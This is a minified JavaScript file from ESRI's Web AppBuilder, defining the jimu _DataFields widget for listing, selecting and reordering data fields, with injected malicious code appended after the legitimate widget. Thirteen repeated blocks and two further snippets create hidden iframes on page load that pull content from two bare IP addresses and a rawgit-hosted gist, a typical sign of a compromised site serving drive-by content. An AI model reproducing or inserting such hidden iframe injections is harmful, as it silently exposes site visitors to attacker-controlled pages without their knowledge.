// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:jimu/dijit/templates/_DataFields.html":'\x3cdiv\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"fieldsContent" class\x3d"fields-content"\x3e\r\n\t\x3c/div\x3e\r\n\t\x3cdiv class\x3d"operation"\x3e\r\n\t\t\x3cdiv data-dojo-attach-point\x3d"btnUp" data-dojo-attach-event\x3d"onclick:_moveUp" class\x3d"jimu-icon jimu-icon-up" title\x3d"${nls.moveUp}"\x3e\x3c/div\x3e\r\n\t\t\x3cdiv data-dojo-attach-point\x3d"btnDown" data-dojo-attach-event\x3d"onclick:_moveDown" class\x3d"jimu-icon jimu-icon-down" title\x3d"${nls.moveDown}"\x3e\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/html dojo/_base/query dojo/on dijit/_WidgetBase dijit/_TemplatedMixin dojo/Evented dojo/text!./templates/_DataFields.html".split(" "),function(k,c,e,d,f,g,l,m,n,p){return k([l,n,m],{baseClass:"jimu-dijit-data-fields",templateString:p,isSingle:!1,postMixInProperties:function(){this.nls=c.clone(window.jimuNls.simpleTable)},postCreate:function(){this.inherited(arguments);this.own(g(this.domNode,"click",c.hitch(this,this._onDomClicked)))},
clear:function(){d.empty(this.fieldsContent);this.emit("change")},setSingleMode:function(){this.isSingle=!0;this._checkSingleMode()},setMultipleMode:function(){this.isSingle=!1},_checkSingleMode:function(a){if(this.isSingle){var b=f("input",this.domNode),b=e.filter(b,c.hitch(this,function(a){return a.checked}));0!==b.length&&(a||(a=b[0]),b=e.filter(b,c.hitch(this,function(b){return b!==a})),e.forEach(b,c.hitch(this,function(a){a.checked=!1})))}},setFields:function(a){this.clear();e.forEach(a,c.hitch(this,
function(a){var b=d.toDom('\x3cdiv class\x3d"field-item"\x3e\x3cinput type\x3d"checkbox" /\x3e\x3cspan class\x3d"jimu-ellipsis" /\x3e\x3c/div\x3e'),e=f("input",b)[0],h=f("span",b)[0];e.checked=!!a.checked;h.innerHTML=a.alias||a.name;h.title=a.alias||a.name;b.fieldName=a.name;d.place(b,this.fieldsContent);this.own(g(e,"change",c.hitch(this,function(){e.checked&&this._checkSingleMode(e);this.emit("change")})))}));this.emit("change")},selectFields:function(a,b){c.isArrayLike(a)&&(a=c.clone(a),a.reverse(),
e.forEach(a,c.hitch(this,function(a){if(a=this._getFieldItemDivByName(a))b||d.place(a,a.parentNode,"first"),f("input",a)[0].checked=!0})));this.emit("change")},getSelectedFieldNames:function(){var a=f(".field-item",this.fieldsContent),b=[];e.forEach(a,c.hitch(this,function(a){f("input",a)[0].checked&&b.push(a.fieldName)}));return b},_getFieldItemDivByName:function(a){var b=f(".field-item",this.fieldsContent);return e.filter(b,c.hitch(this,function(b){return b.fieldName===a}))[0]},_onDomClicked:function(a){a=
a.target||a.srcElement;if(d.isDescendant(a,this.fieldsContent)&&a!==this.fieldsContent){var b=a.tagName.toLowerCase(),c=null;d.hasClass(a,"field-item")?this._selectFieldItemDom(a):"span"===b?(c=a.parentNode,this._selectFieldItemDom(c)):"input"===b&&(c=a.parentNode,a.checked?this._selectFieldItemDom(c):d.removeClass(c,"selected"));this._updateHighLightIcons()}},_updateHighLightIcons:function(){var a=this._getSelectedFieldItemDiv();a&&d.hasClass(a,"selected")&&(a.previousSibling?d.addClass(this.btnUp,
"high-light"):d.removeClass(this.btnUp,"high-light"),a.nextSibling?d.addClass(this.btnDown,"high-light"):d.removeClass(this.btnDown,"high-light"))},_selectFieldItemDom:function(a){f(".field-item",this.fieldsContent).removeClass("selected");d.addClass(a,"selected")},_getSelectedFieldItemDiv:function(){var a=null,b=f(".field-item.selected",this.fieldsContent);0<b.length&&(a=b[0]);return a},_moveUp:function(){var a=this._getSelectedFieldItemDiv();a&&a.previousSibling&&d.place(a,a.previousSibling,"before");
this._updateHighLightIcons()},_moveDown:function(){var a=this._getSelectedFieldItemDiv();a&&a.nextSibling&&d.place(a,a.nextSibling,"after");this._updateHighLightIcons()}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});